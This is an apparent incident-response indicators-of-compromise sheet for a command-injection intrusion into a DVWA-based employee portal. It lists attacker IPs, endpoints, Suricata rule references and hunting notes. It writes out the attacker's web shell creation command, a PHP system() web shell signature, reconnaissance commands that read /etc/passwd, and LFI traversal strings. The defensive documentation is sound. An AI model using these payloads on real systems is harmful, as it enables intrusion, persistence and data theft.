# Indicators of Compromise: INC-2026-005

Consolidated from web_access.log, auth.log, and PCAP analysis. Formatted for SIEM ingestion and threat-hunting reuse.

---

## Network indicators

| Type | Value | Context |
|---|---|---|
| Attacker IP | 172.16.50.10 | External, shares subnet with scanners 172.16.50.20-26 |
| User-Agent | curl/8.14.1 | Consistent across all attacker requests (scripted tooling) |
| Target host | 192.168.10.22 (bru-web-01) | Employee self-service portal |

## Endpoint indicators

| Type | Value |
|---|---|
| Command injection endpoint | /dvwa/vulnerabilities/exec/ (POST) |
| LFI endpoint | /dvwa/vulnerabilities/fi/?page= (GET, all attempts failed) |
| Web shell endpoint | /shell.php?cmd= (GET) |

## Payload signatures

| Type | Value |
|---|---|
| Injection separator | `;` (URL-encoded %3B) appended after `ip=127.0.0.1` |
| Reconnaissance commands | id, whoami, cat /etc/passwd, ls -la /var/www/html/, uname -a |
| Web shell write | `echo '<?php system($_GET["cmd"]); ?>' > /var/www/html/shell.php` |
| LFI traversal pattern | ?page=../../../../etc/passwd (and os-release, config.inc.php, access.log) |

## Host artifacts

| Type | Value |
|---|---|
| Persistence artifact | /var/www/html/shell.php (attacker-created web shell) |
| Web shell signature | `<?php system($_GET["cmd"]); ?>` |
| Execution context | www-data (uid=33, Apache service account) |

## Account indicators

| Type | Value |
|---|---|
| Pivot account | j.martin |
| Pivot method | SSH (password authentication, Accepted) |
| Pivot source | 172.16.50.10 |
| Pivot timestamps | 2026-06-05 15:47:15, 15:47:17, 15:47:20 (UTC+02:00) |

---

## Detection rule reference (Suricata)

| SID | Indicator detected |
|---|---|
| 1000001 | System-file targeting in command injection body |
| 1000002 | Web shell usage |
| 1000003 | Web shell write |
| 1000004 | RCE confirmed (response side, www-data) |
| 1000005 | /etc/passwd exfiltration (response side) |

Full rule text in `../detection/local-cmdinjection.rules`.

---

## Hunting notes

- The attacker is identified by request pattern and authentication state, not by IP volume. It issued the lowest request count of its subnet (18), the opposite of noisy scanners.
- The LFI endpoint was exercised but disclosed nothing: all four traversals returned an identical 3868-byte default error page. Do not attribute the data leak to LFI; the leak channel was command injection exclusively.
- The j.martin credential appears in the leaked /etc/passwd output (username only; the password hash resides in /etc/shadow, not observed leaking in this capture). Credential acquisition source is unconfirmed.
